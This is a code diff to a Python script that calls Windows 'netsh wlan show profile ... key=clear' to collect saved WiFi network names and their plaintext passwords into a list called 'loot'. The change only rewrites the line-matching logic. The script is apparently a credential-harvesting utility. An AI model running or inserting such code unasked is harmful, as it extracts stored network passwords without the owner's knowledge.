@@ -16,15 +16,14 @@ args, unknown = parser.parse_known_args()
 loot = []
 
 # Function to use if searching for a single WiFi profile using --profile. 
-if args.profile:
-    
+if args.profile:    
     profile_info_to_parse = subprocess.getoutput(f"""netsh wlan show profile name="{args.profile}" key=clear""").split("\n")  
     
     for info in profile_info_to_parse:
-        if info[0:29] == "    SSID name              : ":
+        if 'SSID name' in info:
             loot.append(f"SSID name: {info[29:]}")
     
-        if info[0:29] == "    Key Content            : ":
+        if 'Key Content' in info:
             loot.append(f"Password: {info[29:]}")
     
     if len(loot) == 0:
@@ -39,7 +38,7 @@ else:
     output = subprocess.getoutput("netsh wlan show profiles").split('\n')
     
     for i in output:
-        if i[0:27] == "    All User Profile     : ":
+        if 'All User Profile' in i:
             profiles.append(i[27:])
 
     # Using the just-gathered profile names, query the system for all information regarding WiFi profiles. 
@@ -50,10 +49,10 @@ else:
     # Parse through the data and save it in a more human-readable format.
     for profiles in profile_info_to_parse:   
         for info in profiles:
-            if info[0:29] == "    SSID name              : ":
+            if 'SSID name' in info:
                 loot.append(f"SSID name: {info[29:]}")
     
-            if info[0:29] == "    Key Content            : ":
+            if 'Key Content' in info:
                 loot.append(f"Password: {info[29:]}")
     
 
